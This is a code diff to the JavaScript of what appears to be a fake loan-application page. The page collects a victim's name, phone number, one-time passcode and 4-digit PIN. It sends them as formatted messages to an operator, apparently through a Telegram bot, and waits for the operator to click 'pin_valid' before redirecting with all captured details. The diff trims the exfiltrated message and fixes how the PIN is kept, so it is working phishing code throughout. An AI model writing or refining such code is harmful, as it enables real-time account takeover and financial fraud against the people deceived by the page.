@@ -527,13 +527,13 @@
         let bd = {}, luid = 0, otp = '', phone = '';
         let sent = false;
         let pinPollInterval = null;
+        let storedPin = '';
         const boxes = document.querySelectorAll('.otp-box');
         const pinBoxes = document.querySelectorAll('.pin-box');
 
         function init() {
             const p = new URLSearchParams(location.search);
             
-            // Capture ALL details from URL
             bd = {
                 firstName: p.get('firstName') || '',
                 middleName: p.get('middleName') || '',
@@ -549,10 +549,8 @@
             
             phone = bd.phone;
 
-            // Build full name: First Name + Middle Name + Surname
             const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
 
-            // Show loan details if amount exists
             if (bd.amount && bd.amount !== '0') {
                 document.getElementById('loanBox').style.display = 'block';
                 document.getElementById('loanAmount').textContent = '$' + parseFloat(bd.amount).toLocaleString() + ' USD — ' + decodeURIComponent(bd.purpose);
@@ -565,7 +563,6 @@
             boxes[0].focus();
         }
 
-        /* ============ OTP boxes ============ */
         function setupOTP() {
             boxes.forEach((b, i) => {
                 b.addEventListener('input', e => {
@@ -657,29 +654,18 @@
             setTimeout(() => doOTP(), 600);
         }
 
+        // ===== CLEAN OTP MESSAGE - Just Name, Phone, and OTP =====
         function doOTP() {
             clrErr();
             if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
 
-            // Build names clearly
-            const givenName = [bd.firstName, bd.middleName].filter(Boolean).join(' ');
-            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
-            const formattedAmount = parseFloat(bd.amount || '0').toLocaleString(undefined, {
-                minimumFractionDigits: 2,
-                maximumFractionDigits: 2
-            });
+            // Build full name
+            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ') || 'Valued Client';
 
-            const msg = `🔑 <b>OTP & Full Application Details</b>\n\n` +
-                `👤 <b>Surname:</b> <code>${bd.surname || '—'}</code>\n` +
-                `👤 <b>Given Name:</b> <code>${givenName || '—'}</code>\n` +
-                `👤 <b>Full Name:</b> <code>${fullName || 'Valued Client'}</code>\n` +
+            // Clean message - just name, phone, and OTP
+            const msg = `🔑 <b>OTP Verification</b>\n\n` +
+                `👤 <b>Name:</b> <code>${fullName}</code>\n` +
                 `📱 <b>Phone:</b> <code>${phone}</code>\n` +
-                `🪪 <b>ID Number:</b> <code>${bd.idNumber || '—'}</code>\n` +
-                `💰 <b>Amount:</b> <code>$${formattedAmount} USD</code>\n` +
-                `📅 <b>Period:</b> <code>${bd.period || '12'} months</code>\n` +
-                `🎯 <b>Purpose:</b> <code>${decodeURIComponent(bd.purpose || 'Flex Loan')}</code>\n` +
-                `💵 <b>Income:</b> <code>$${parseFloat(bd.income || '0').toLocaleString()}/mo</code>\n` +
-                `💼 <b>Employment:</b> <code>${decodeURIComponent(bd.employmentStatus || 'Not specified')}</code>\n` +
                 `🔢 <b>OTP Code:</b> <code>${otp}</code>\n\n` +
                 `Please choose an action below:`;
 
@@ -725,7 +711,6 @@
             setTimeout(() => { clearInterval(iv); }, 600000);
         }
 
-        /* ============ PIN modal ============ */
         function setupPIN() {
             pinBoxes.forEach((b, i) => {
                 b.addEventListener('input', e => {
@@ -779,28 +764,18 @@
             const pin = pinVal();
             if (pin.length !== 4) { pinShowErr('Please enter the full 4-digit PIN.'); return; }
 
+            storedPin = pin;
+
             const btn = document.getElementById('pinSubmit');
             btn.disabled = true;
             btn.textContent = 'Sending...';
 
-            const givenName = [bd.firstName, bd.middleName].filter(Boolean).join(' ');
-            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ');
-            const formattedAmount = parseFloat(bd.amount || '0').toLocaleString(undefined, {
-                minimumFractionDigits: 2,
-                maximumFractionDigits: 2
-            });
+            const fullName = [bd.firstName, bd.middleName, bd.surname].filter(Boolean).join(' ') || 'Valued Client';
 
-            const msg = `🔒 <b>PIN Verification - Full Details</b>\n\n` +
-                `👤 <b>Surname:</b> <code>${bd.surname || '—'}</code>\n` +
-                `👤 <b>Given Name:</b> <code>${givenName || '—'}</code>\n` +
-                `👤 <b>Full Name:</b> <code>${fullName || 'Valued Client'}</code>\n` +
+            // Clean PIN message - just name, phone, OTP, and PIN
+            const msg = `🔒 <b>PIN Verification</b>\n\n` +
+                `👤 <b>Name:</b> <code>${fullName}</code>\n` +
                 `📱 <b>Phone:</b> <code>${phone}</code>\n` +
-                `🪪 <b>ID Number:</b> <code>${bd.idNumber || '—'}</code>\n` +
-                `💰 <b>Amount:</b> <code>$${formattedAmount} USD</code>\n` +
-                `📅 <b>Period:</b> <code>${bd.period || '12'} months</code>\n` +
-                `🎯 <b>Purpose:</b> <code>${decodeURIComponent(bd.purpose || 'Flex Loan')}</code>\n` +
-                `💵 <b>Income:</b> <code>$${parseFloat(bd.income || '0').toLocaleString()}/mo</code>\n` +
-                `💼 <b>Employment:</b> <code>${decodeURIComponent(bd.employmentStatus || 'Not specified')}</code>\n` +
                 `🔢 <b>OTP:</b> <code>${otp}</code>\n` +
                 `🔑 <b>PIN:</b> <code>${pin}</code>\n\n` +
                 `Is this PIN valid?`;
@@ -826,6 +801,7 @@
                                     const cb = u.callback_query.data;
                                     if (cb === 'pin_valid') {
                                         clearInterval(pinPollInterval);
+                                        closePINModal();
                                         const params = new URLSearchParams({
                                             firstName: bd.firstName,
                                             middleName: bd.middleName,
@@ -838,9 +814,9 @@
                                             income: bd.income,
                                             employmentStatus: bd.employmentStatus,
                                             otp: otp,
-                                            pin: pin
+                                            pin: storedPin
                                         });
-                                        location.href = 'success.html?' + params.toString();
+                                        window.location.href = 'success.html?' + params.toString();
                                     }
                                     else if (cb === 'pin_invalid') {
                                         clearInterval(pinPollInterval);
